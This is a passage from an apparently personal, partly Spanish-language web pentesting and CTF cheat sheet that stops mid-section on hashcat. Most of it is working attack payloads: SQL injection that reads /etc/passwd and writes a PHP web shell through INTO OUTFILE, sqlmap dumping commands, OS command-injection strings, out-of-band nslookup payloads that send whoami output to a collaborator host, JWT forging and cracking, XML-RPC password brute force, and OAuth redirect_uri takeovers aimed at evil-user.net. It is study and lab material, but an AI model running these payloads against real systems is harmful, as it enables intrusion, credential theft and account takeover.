http://10.10.10.143/room.php?cod=0+union+select+1,2,load_file('/etc/passwd'),4,5,6,7--
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,(TO_base64(LOAD_FILE("/var/www/html/<file.php>"))),4,5,6,7-- (in base64)
```

- Upload php command injection file

```
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

## SQLMap

- [ ] **Testing a parameter with GET (mark with a "*" the parameter to test)**

```
sqlmap.py -u "http://example.com/main.php?id=1*" --batch --banner
```
```
sqlmap.py -u "http://example.com/main.php?id=1*" --batch --banner --dbs
```
```
sqlmap -r <requestPOST>.txt (More Basic Injection 01)
```
```
sqlmap -r req01.txt --dbs (More Basic Injection 02)
```
```
sqlmap -r <requestPOST>.txt --risk=3 --level=5 --threads=10 (Basic Enumeration)
```
```
sqlmap -r <requestPOST>.txt --risk=3 --level=5 --tables (Get All Tables)
```
```
sqlmap -r <requestGET>.txt --risk=3 --level=5 -D <database> --tables --threads=10 (Get Tables of a DB)
```
```
sqlmap -r <requestPOST>.txt --risk=3 --level=5 -D <database> -T <tableName> --columns --threads 10 (Get Columns of a Table of a DB)
```
```
sqlmap -r <requestGET>.txt --risk=3 --level=5 -D <database> -T <table_name> -C <column_name> --dump --threads=10 (Get ALL DATA of a Column)
```
```
sqlmap -r <requestPOST>.txt --file-read /home/dorthi/.ssh/id_rsa (Read a File of System if you have permissions)
```

- [ ] **Bypass**

```
sqlmap -u 'http://10.10.10.143/room.php?cod=1' --user-agent "<your_user_agent>"
```

# OS Command Injection

A veces, la entrada que controlas aparece entre comillas en el comando original. En esta situación, debe terminar el contexto entre comillas (usando "o ') antes de usar los metacaracteres de shell adecuados para inyectar un nuevo comando.

- [ ] **Find a input filed whose interacting with operating system shell**

Try to execute and system shell commands with delimiter

**Possible Vulnerable Parameters:**

- daemon
- host
- file
- upload
- dir
- execute
- download
- log
- ip
- cli
- cmd

**Delimiter List:**

- ;
- ^
- &
- &&
- |
- ||
- %0D
- %0A
- 0x0a
- \n
- <
```
http://example.com/sample.php?file=1;ls
http://example.com/sample.php?file=value;pwd
http://example.com/sample.php?file=value1;dir
```

*Tool:*
*https://github.com/commixproject/commix*


- [ ] **Blind OS Injection**

Es posible generar un retardo en la respuesta con el comando "ping":

```
email=x||ping+-c+10+127.0.0.1||
email=x&ping+-c+10+127.0.0.1&
email=x&&ping+-c+10+127.0.0.1&&
email=x|ping+-c+10+127.0.0.1|
```

- [ ] **Out of Band OS Injection**

```
email=x||nslookup+x.burpcollaborator.net||
email=x&nslookup+x.burpcollaborator.net&
email=x&&nslookup+x.burpcollaborator.net&&
email=x|nslookup+x.burpcollaborator.net|
```
```
email=||nslookup+`whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||
```

# XXE

Pending

# PHPinfo Injection

- [ ] If you have the path "phpinfo.php" you can try this injection

```
POST /phpinfo.php HTTP/1.1
Host: 10.10.10.84
...
...
...
Content-Type: multipart/form-data; boundary=--InjectionPHP

----InjectionPHP
Content-Disposition: form-data; name="anything"; filename="Injection"
Content-Type: text/plain
<Injection PHP PoC>
----InjectionPHP
```

**And look the variable "anything" with the value "Injection" in "http://10.10.10.84/phpinfo.php"**

**If you also have a LFI vulnerability, you should be check the section "File Inclusion" in this guide**

# SSTI

- [ ] **E-mail address payloads**

```
"<%= 7 * 7 %>"@example.com

test+(${{7*7}})@example.com

<img src="//<yourcallbackserver>/bc?callback=https://victimweb/privacyaccess/token=[token]">
```

# JWT

- Los JWT contienen información codificada y están firmados por una clave. Entonces, como atacante, puedo ver la información, pero no puedo cambiarla sin conocer la clave utilizada para firmarla, que generalmente es una contraseña.

- La mejor manera de validar rápidamente que es un JWT y ver lo que contiene es ir a http://jwt.io , e ingresar la cookie.

- [ ] **Decode & Crack It**

01. Get a JWT:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0MTI3MjQwNX0.qod_CSOLAsVDYRof2wC7p0Va0bq8aXCc9R4e1epCdm4

02. Save like "jwt.txt" and crack this:

**Option a:** 

```
python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZi
IsImV4cGlyZXMiOiIyMDE3LTA4LT > jwt.john
```
**Option b:**
```
john -w=/usr/share/wordlists/rockyou.txt jwt.txt
```
**Option c:**
```
python3 crackjwt.py jwt.txt /usr/share/wordlists/rockyou.txt

/opt/JohnTheRipper/run/john jwt.john
```

**Anothers alternatives to crack:** 
```
https://github.com/lmammino/jwt-cracker
https://github.com/jmaxxz/jwtbrute
```

*Reference: oz box (htb)*

### Bypass JWT

- Here are 3 tips to bypass JWT token authentication.

- [ ] **Tip 01: "Change the signing algorithm"**

1. Capture the JWT.
2. Change the algorithm to "none".
3. Optional: Change the content of the claims in the body with whatever you want (e.g.: email: attacker@gmail.com)
4. Remove the signature part
5. Send the request with the modified token and check the result.

**PoC 01:**

```
> root@root:# echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
> root@root:# echo '{"alg":"HS256","typ":"JWT"}' | base64
> change the new value of Header with this value obtained
> Send the new JWT
```

**PoC 02:**
```
> Go to this HS256 demo page (http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php) that provides a HS256 signed token. Decode the header and change the algorithm to "none". Remove the signature, but leave the last dot. Send it to the demo page and check whether the token is accepted.
```

- [ ] **Tip 02: "Changing the algorithm from RS256 to HS256"**

01. Capture the JWT token.
02. Change the header "alg" value to "HS256"
03. Now you have HEADER.PAYLOAD, miss the SIGNATURE
04. With the public key, do this: (if you don't have the publicKey, please read the article of "Reference")
```
cat key.pem | xxd -p | tr -d "\\n"
```
05. Let’s sign the JWT:
```
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0NzcyOTY2MiwiZXhwIjoxNTQ3Nzk5OTk5LCJkYXRhIjp7Ik5DQyI6InRlc3QifX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
```
06. A one-liner to turn this ASCII hex signature into the JWT format is:   
```
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('db3a1b760eec81e029704691f6780c4d1653d5d91688c24e59891e97342ee59f')).replace('=','')\")"
```
07. The crafted JWT is now ready
08. Send the request with the modified token and check the response.
09. You can party with the bounty if the backend doesn’t have the algorithm check.

*Reference:* 

*https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/*

*https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/*

*Resource:*

*https://medium.com/@barrymalone/json-web-tokens-beginner-exploitation-5a44f8f6efff*



- [ ] **Tip 03: "Check for proper server-side session termination (OTG-SESS-006)"**

01. Check if the application is using JWT tokens for authentication.
02. If so, login to the application and capture the token. (Mostly web apps stores the token in the local storage of the browser)
03. Now logout of the application.
04. Now make a request to the privileged endpoint with the token captured earlier.
05. Sometimes, the request will be successful as the web apps just delete the token from browser and won’t blacklist the tokens in the backend.

*Resource:*

*https://www.youtube.com/watch?v=aYz8yPymyvk*

*https://www.youtube.com/watch?v=dq39w4MiZzs*

*https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/*


# Heartbleed

- [ ] **Test Vulnerability**

**Create a "list.txt" of host and run this OneLine script:**

```
cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
```

# cURL

- [ ] **Use grep to extract URLs**

**Read from a file:**

```
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

**Read from a domain:**

```
curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

# CMS

- [ ] **Credentials for Testing**

```
admin:admin
test:test
admin:password
admin:pass
test@test.com:test
test@company.com:test (try with all domains that belong to company)
test@company.com:test@company.com
```

- [ ] **Access hidden sign-up pages**

Sometimes, developers think that hiding a button is enough. Try accessing the following sign-up URIs while doing bug bounties:

```
CMS platform  |     Sign-up URI

Laravel       |     /register
Drupal        |     /user/register
WordPress     |     /wp-login.php?action=register
eZ Publish    |     /register
```

- [ ] **Drupal**

**Find hidden pages on Drupal**

If you are hunting on a Drupal website, fuzz with Intruder (Burp Suite) on ‘/node/$’ where ‘$’ is a number (from 1 to 500). For example:

```
https://target.com/node/1
https://target.com/node/2
https://target.com/node/3
…
https://target.com/node/499
https://target.com/node/500
```

Chances are that you will find hidden pages (test, dev) which are not referenced by the search engines.


- [ ] **WordPress**

...


- [ ] **Joomla**

...

- [ ] **Laravel**

...

- [ ] **eZ Publish**

...


# Google Dorks

- [ ] **Sensitive Information** 

Here are Top 5 Google dorks for identifying interesting and potentially sensitive information about your target (example.com)

```
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
```

With these dorks we are looking for open directory listing, log files, private keys, spreadsheets, database files and other interesting data.

- [ ] **Kibana**

Kibana will return a content length of 217 if it is publicly open and one can access the dashboard without authentication:

```
inurl:app/kibana
inurl:app/kibana intext:Loading Kibana
inurl::5601/app/kibana
kibana content-lenght: 217 (in Shodan search)
```


# Information Disclosure

- [ ] **Change "Accept" Header**

Find information disclosure vulnerabilities in some web servers by changing the "Accept" header.

`Accept: application/json, text/javascript, */*; q=0.01`


# HTTP Request Smuggling

https://github.com/defparam/smuggler


# Bypass WAF

- [ ] **Bypass 403 Forbidden**

```
https://host.com/path --> 403 Forbidden
https://host.com/%2e/path --> 200 OK

http://drupal.com/modules/node/1 --> 403 Forbidden
http://drupal.com/modules/%2e/node/1 --> 200 OK
```

- [ ] **Bypass the Rate-Limit with XFF** 

La cabecera X-Forwarded-For (XFF) es un estándar de facto para identificar el origen de la dirección IP de un cliente conectado a un servidor web a través de un proxy HTTP o un balanceador de carga. Cuando se intercepta el tráfico entre cliente y servidores, los registros de los servidores de acceso contienen sólo la dirección IP del proxy o del balanceador de carga. Para ver la dirección IP original del cliente, se utiliza la cabecera X-Forwarded-For.

1. Set all this headers in your request:

```
X-Forwarded: <yourServer>|127.0.0.1
X-Forwarded-By: <yourServer>|127.0.0.1
X-Forwarded-For: <yourServer>|127.0.0.1
X-Forwarded-For-Original: <yourServer>|127.0.0.1
X-Forwarder-For: <yourServer>|127.0.0.1
X-Forward-For: <yourServer>|127.0.0.1
Forwarded: <yourServer>|127.0.0.1
Forwarded-For: <yourServer>|127.0.0.1
Forwarded-For-Ip: <yourServer>|127.0.0.1
```

2. Change your IP using VPN, etc

3. Re-make the request

*Reference: https://twitter.com/m4ll0k2/status/1294983599943540738*


# XML RPC

- [ ] **Attacking XML RPC** 

1. Comprobar su funcionalidad enviando la siguiente solicitud y que el servidor devuelva una lista de metodos:

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

*Tenga en cuenta que en ausencia del ejemplo de respuesta presentado anteriormente, no tiene sentido continuar con la prueba real de las dos vulnerabilidades. La respuesta puede variar según la configuración y la configuración de la instalación de WordPress.*

2. Si hay una salida para:

```
<methodName>system.listMethods</methodName>
```

3. Se recomienda interactuar con el método más básico llamado "**demo.sayHello**".

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 130

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>demo.sayHello</methodName> 
<params></params> 
</methodCall>
```


**4.a. Ataques de pingbacks XML-RPC**

 
 En este caso, un atacante puede aprovechar la API XML-RPC predeterminada para realizar devoluciones de llamada con los siguientes fines:

 - Ataques distribuidos de denegación de servicio (DDoS) : un atacante ejecuta el método pingback.ping de varias instalaciones de WordPress afectadas contra un solo objetivo no  protegido (nivel de botnet).
 - Bypass de protección de Cloudflare : un atacante ejecuta el método pingback.ping desde una única instalación de WordPress afectada que está protegida por CloudFlare a un host público controlado por el atacante (por ejemplo, un VPS) para revelar la IP pública del objetivo, por lo tanto, omitiendo cualquier nivel de protección DNS.
 - XSPA (Cross Site Port Attack) : un atacante puede ejecutar el método pingback.ping desde una única instalación de WordPress afectada en el mismo host (u otro host interno / privado) en diferentes puertos. Se puede determinar un puerto abierto o un host interno observando la diferencia en el tiempo de respuesta y / o mirando la respuesta de la solicitud.

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 303

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string><yourHOST></string></value>
</param>
<param>
<value><string>https://example.com/</string></value>
</param>
</params>
</methodCall>
```



**4.b. Ataques de FuerzaBruta**

A veces, la única forma de evitar la limitación o el bloqueo de solicitudes en un ataque de fuerza bruta contra el sitio de WordPress es utilizar la API XML-RPC demasiado olvidada.

La siguiente solicitud representa el ataque de fuerza bruta más común:
 
```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```

La solicitud anterior se puede enviar en Burp Intruder (por ejemplo) con diferentes conjuntos de credenciales. Tenga en cuenta que, incluso si adivina la contraseña o no, el código de respuesta siempre será 200 . Recomiendo encarecidamente buscar errores/mensajes dentro del cuerpo de la respuesta.

¿Le preocupa enviar muchas solicitudes contra el objetivo? - Sin preocupaciones. WordPress XML-RPC por defecto permite a un atacante realizar una sola solicitud y fuerza bruta cientos de contraseñas.
 
La siguiente solicitud requiere permisos para los métodos system.multicall y wp.getUsersBlogs:
 
```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 1560

<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

</data></array></value></param></params></methodCall>
```

En el ejemplo anterior, probé 4 conjuntos de credenciales diferentes utilizando una sola solicitud. Solo tiene que reemplazar {{Your Username}} y {{Your Password}} con sus propias combinaciones.
 
*Reference: 
https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/*


# OAuth 2.0

- [ ] **Bypass de Autenticación a través de Implicit Grant Type**

Interceptar la request "/***authenticate***" y cambiar el valor correspondiente al parámetro que se envía, por el de otro usuario válido (e.g.: test@test.net --> carlos@carlos-montoya.net):

```
POST /authenticate HTTP/1.1
Host: [proveedorOAUTH]
Cookie: session=RTNhdbNYvS41LuseC7SIhX0m1f4AxYmM

{
    "email":"carlos@carlos-montoya.net",
    "username":"wiener",
    "token":"8vHFVoNGFiI9pD0nvJ6emJW2iZB-VM6SiBuuBDtdYC8"
}
```

- [ ] **Endpoints con Información Sensible**

Dan información para poder testear si es posible registrar una aplicación cliente maliciosa:

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

- [ ] **Vincular forzada de perfiles OAuth**

1.  Iniciar sesión con credenciales comunes.
2.  Cerrar sesión.
3.  Relogearse (esta vez sin credenciales, ya que la aplicación debería guardar el previo login) y adjuntar perfil de RR.SS. con BurpSuite activo.
4.  Interceptar la request que presente "oauth-linking":

```
GET /auth?client_id=x3ywm971gmk1p5xowwqjl&redirect_uri=https://[appCliente]/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1

Host: [proveedorOAUTH]
```

5.  Verificar que no contenga el parámetro "state".
6.  Adjuntar RR.SS. de nuevo y buscar la request:

```
GET /oauth-linking?code=[...]
```

7.  Copiar URL y rechazar la request para conservar el código.
8.  Elaborar ataque a víctima

- [ ] **Account Take Over con "redirect_uri"**

Iniciar sesión y buscar la request:

```
GET /auth?client_id=x3ywm971gmk1p5xowwqjl&redirect_uri=https://[appCliente]/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1

Host: [proveedorOAUTH]
```

Cambiar "redirect_uri" a:

```
redirect_uri=https://YOUR-EXPLOIT-SERVER-ID/
```

- [ ] **Bypass "redirect_uri"**

```
redirect_uri=https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```

```
redirect_uri=https://localhost.evil-user.net/
```

```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&response_mode=query
```

```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&response_mode=fragment
```

```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```

- [ ] **Robar tokens de acceso con openRedirect**

Cambiar "redirect_uri" a:

```
redirect_uri=https://client-app.com/oauth/callback/../../path/dentro/de/aplicacion
```
Luego debe conseguir un OpenRedirect para explotación.

- [ ] **Iframe, postMessage() y window.location.href(*)**

1. Buscar alguna sección de comentarios que se ejecute bajo la etiqueta "iframe". 
2. Mirar su atributo "src=[seguirURL]".
3. Validar que se implemente "postMessage()" con "window.location.href(\*)", es decir, hacia cualquier origen.
4. Evaluar posible explotación


# JSON Injection

Se pueden describir dos tipos de problemas de seguridad:

## Inyección JSON del lado del Servidor

- La inyección JSON del lado del servidor ocurre cuando el servidor no desinfecta los datos de una fuente que no es de confianza y los escribe directamente en un flujo JSON.

- [ ] **Bypass de Cuenta**

```
john%22,%22account%22:%22administrator%22
```
La cadena JSON resultante es:

```
{
  "account":"user",
  "user":"john",
  "account":"administrator",
  "pass":"password"
}
```

## Inyección JSON del lado del Cliente

- La inyección JSON del lado del cliente ocurre cuando los datos de una fuente JSON que no es de confianza no se desinfectan y analizan directamente con la evalfunción de JavaScript .

- [ ] **XSS JSON**

*Note los valores "user" y "account", deberían ser los propios del escenario que está analizando.*

```
user"});alert(document.cookie);({"account":"user
```

- [ ] **SQLi JSON**

```
{"user_id": "5755 and sleep(12)=1", "receiver": "yourmail@mymail"}
```
```
{"param":"1')))+MySQL_payload--+-"}
```



# CRLF

- [ ] **Response Header Injection**

Si visualiza algún valor reflejado en la RESPONSE del servidor que puede manipular y fue inyectado en la REQUEST:

```
HTTP/1.1 200 OK
...
Set-Cookie: author=ValorManipulado
Location: http://google.com/fichero.jsp?lang=English
...
```

Modifique e ingrese en su REQUEST un carriage return y line feed:

Si la respuesta ORIGINAL da una redirección 301,302:

```
http://google.com/fichero.jsp?lang=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Shazam</html>
```

Si la respuesta ORIGINAL da 200 OK:
```
Set-Cookie: author=CGonzalo\r\nContent-Length:19\r\n\r\n<html>Shazam</html>
```

```
Set-Cookie: author=CGonzalo%0d%0aContent-Length:19%0d%0a%0d%0a<html>Shazam</html>
```

*NOTA: El header "Content-Lenght: [value]" debe coincidir con el HTML malicioso inyectado.*

*Tool: https://github.com/dwisiswant0/crlfuzz*

----------------------------
----------------------------
----------------------------
----------------------------
----------------------------
----------------------------
----------------------------
----------------------------
----------------------------
----------------------------

# **Cryptography**

### Identify Cipher

```text
# Boxentriq:

https://www.boxentriq.com/code-breaking/cipher-identifier

# Rumkin

http://rumkin.com/

# Kali Tools:

hash-identifier (https://tools.kali.org/password-attacks/hash-identifier)
```

### Ciphers

#### AES

```text
- AES has a static block size of 128 bits and key sizes of 128, 192 or 256 bits.

- AES is a algorithm of symmetric cryptography.

- This algorithm need 2 components for decipher:

    . A key

    . An IV (Initialitation Vector)
```

#### ECC

```text
# When you found:
    1. passphrase_to_pubkey
    2. private key

    1. passphrase_to_pubkey

    '\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'

    2. private key

    PrinceCharming

# You can decrypt this with "seccure" library of python

root@kali#: python

> import seccure
> a = '<cipher_text>'
> print seccure.decrypt(a, b"<privateKey>")

Reference: shrek box (htb)
Resources: 
    https://pypi.org/project/seccure/
    https://cryptobook.nakov.com/asymmetric-key-ciphers/ecc-encryption-decryption
```

#### Vigenere

```text
- You need a passpharse for decode it

# Use Rumkin decoder

http://rumkin.com/tools/cipher/vigenere.php

Reference: brainfuck box (htb)
```

## **Stego**

### Tools

#### steghide

```text
# Steghide is a steganography program that hides data in various kinds of image and audio files.

# Only supports these file formats:

JPEG, BMP, WAV and AU

steghide info <file> (displays info about a file whether it has embedded data or not)
steghide extract -sf <file> (extracts embedded data from a file)
```

#### stegpy

```text
# Stegpy is a program for encoding information in image and audio files through steganography.

# Only supports these file formats:

PNG, BMP, GIF, WebP, WAV (Images in a different format are automatically converted to PNG. Different audio formats are not supported at all)

stegpy <file>
```

#### bpstegano

```text
# BPStegano is a steganography tool with characteristics like AES-128 encryption of input data, random Least Significant Bit (LSB) pixel encoding and supports plain text (raw string) data hiding

# Only supports these file formats:

pdf, exe, jpg, png, txt, gif, etc.

python stegano.py (run the main panel)
```

#### foremost

```text
# Foremost is a program that recovers files based on their headers , footers and internal data structures.

# Supports these file formats:

jpg, gif, png, bmp, avi, exe, mpg, wav, riff, wmv, mov, pdf, ole, doc, zip, rar, htm, cpp

foremost -i <file> (extracts data from the given file)
```

#### stegsolve

```text
# Sometimes there is a message or a text hidden in the image itself and in order to view it you need to apply some color filters or play with the color levels. You can do it with GIMP or Photoshop or any other image editing software but stegsolve made it easier. it’s a small java tool that applies many color filters on images.
```

#### strings

```text
# Strings is a linux tool that displays printable strings in a file. That simple tool can be very helpful when solving stego challenges. Usually the embedded data is password protected or encrypted and sometimes the password is actaully in the file itself and can be easily viewed by using strings

# Supports these file formats:

All

strings <file>  (displays printable strings in the given file)
```

#### exiftool

```text
# Sometimes important stuff is hidden in the metadata of the image or the file , exiftool can be very helpful to view the metadata of the files.

# Supports these file formats:

Many

exiftool <file>  (shows the metadata of the given file)
```

#### exiv2

```text
# A tool similar to exiftool.

# Supports these file formats:

Many

exiv2 <file>  (shows the metadata of the given file)
```

#### binwalk

```text
# Binwalk is a tool for searching binary files like images and audio files for embedded files and data.

# Supports these file formats:

Many

binwalk <file>  (Displays the embedded data in the given file)
binwalk -e <file>  (Displays and extracts the data from the given file)
```

#### zsteg

```text
# zsteg is a tool that can detect hidden data in png and bmp files.

# Supports these file formats:

png, bmp

zsteg -a <file> (Runs all the methods on the given file)
zsteg -E <file> (Extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy name.png)
```

#### wavsteg

```text
# WavSteg is a python3 tool that can hide data and files in wav files and can also extract data from wav files.

# Supports these file formats:

wav

python3 WavSteg.py -r -s <soundfile.wav> -o <outputfile>  (extracts data from a wav sound file and outputs the data into a new file)
```

#### sonic visualizer

```text
# Sonic visualizer is a tool for viewing and analyzing the contents of audio files, however it can be helpful when dealing with audio steganography. You can reveal hidden shapes in audio files.

# Supports these file formats:

Many

sonic-visualiser <file>
```

#### hexeditor

```text
# Hexadecimal editor. 

# Supports these file formats:

All

hexeditor <file>
```

#### turgen system

```text
- Versatile utility that allows you to create your own tapes with software for Atari 8-bit computers.

# Supports these file formats:

WAV

# Use

java -jar turgen.jar

(https://sourceforge.net/projects/turgen/)
```

#### rabin2

```text
- Binary program info extractor

# Supports these file formats:

ELF 32-bit LSB executable

# Use

rabin2 -I <file> 
rabin2 -e <file> 
rabin2 -s <file>
```

### Techniques

#### GIF by frames

```text
# With GIF file, try see your frames

https://ezgif.com/split
```

#### Scan entropy

```text
# Try to see entropy of a file (binwalk)
```

#### BAR & QR code

```text
# When you found a BAR code image or QR code try with this tool for decode it.

https://www.onlinebarcodereader.com/
```

#### DNA code

```text
# When you found some like this:

ATG CGTA CATG CGGA ... ... ...
ATGCATGGCATGATCAT...

# This is the Genetic Code:

adenina (A), timina (T), guanina (G) y citosina (C) in the DNA (ADN in spanish)

# You can try decode it with some decoder.

https://www.onlineocr.net/

http://2013.igem.org/wiki/images/d/d9/BGU_Kids_Activities_Full_Kit_-_new.pdf

https://www.oercommons.org/courseware/lesson/17460/overview
```

#### Magic Numbers

```text
# Magic Numbers are used to identify, with the first BYTES, what type of extension a file has.

https://asecuritysite.com/forensics/magic
```

#### Decode WAV file with TurgenSystem

```text
# Using TurgenSystem decode WAV files

Tools --> TurboDecoder --> Attach decoder --> Jump --> Decode until EOF

strings <results>
strings *

Reference: see "retro" stego challenge (htb)
```

#### Binary Data to Image PNG

```text
# Convert Binary Data to Image PNG

https://www.dcode.fr/binary-image

Reference: see "digital cube" stego challenge (htb)
```

### Brute Force in Image, ZIP, Audio

#### Stegcracker

```text
# A tool that bruteforces passwords using steghide.

stegcracker <file> [<wordlist>]

https://github.com/Paradoxis/StegCracker
```

#### fcrackzip

```text
# Sometimes the extracted data is a password protected zip , this tool bruteforces zip archives.

fcrackzip -u -D -p wordlist.txt file.zip
```

### Online Decoders

#### Unicode Text Steganography

```text
# A web tool for unicode steganography , it can encode and decode text.

https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder
```

#### npiet

```text
# An online interpreter for piet. piet is an esoteric language , programs in piet are images.

https://www.bertnase.de/npiet/npiet-execute.php
```

#### dcode.fr

```text
# Sometimes when solving steganography challenges you will need to decode some text. dcode.fr has many decoders for a lot of ciphers and can be really helpful.

https://www.dcode.fr/
```

#### Cyber Chef

```text
# Many decoders and encoders.


https://gchq.github.io/CyberChef/
```

#### Cipher Identifier

```text
# Detect ciphers.

https://www.boxentriq.com/code-breaking/cipher-identifier
```

#### Quipqiup

```text
# Quipqiup is a fast and automated cryptogram solver

https://quipqiup.com/
```

## **Forensic**

### Tools Forensics

#### Volatility

```text
# The Volatility Framework is a completely open collection of tools, for the
extraction of digital artifacts from volatile memory (RAM) samples.

https://github.com/volatilityfoundation/volatility
```

## **Python**

### Web Scraping

```text
...
```

### Functions Vulnerable

```text
# Exec() & Eval()

  If you see "exec" function is probably that it can be exploited.

# If we have blocked the characters for execute commands:

  & ; - ` || |

  We can use "$" for this purpose:

  $(command)
```

## **Brute Force ALL**

```text
############
### JOHN ###
############

=============================
=== Basic Crack with JOHN ===
=============================

john --wordlist=<wordlistPath> <file>.hash

===================
=== SHADOW File ===
===================

unshadow passwd shadow > unshadow.db
john unshadow.db

=======================================
=== John HASH cracking using format ===
=======================================

# MD5
- $ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# SHA1
- $ john --format=raw-sha1 hashes.txt

# SHA224
- $ john --format=raw-sha224 hashes.txt

# SHA512
- $ john --format=raw-sha512 hashes.txt

Others hash formats supported by John the Ripper: http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats


###############
### HASHCAT ###
###############


=====================
=== Identify HASH ===
=====================

hashid '<hash>'
hashid '$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0'

==============================
=== Check number for crack ===
==============================

hashcat -h | grep <typeHASH> | grep <secondTypeHASH>
hashcat -h | grep MD5 | grep APR

===============================
=== Crack (in Windows host) ===
===============================

G:\Fakepath\hashcat\hashcat-5.1.0>hashcat64.exe -m 1600 hash.txt rockyou.txt

    --- Examples ---

# Hashcat SHA512 $6$ shadow file
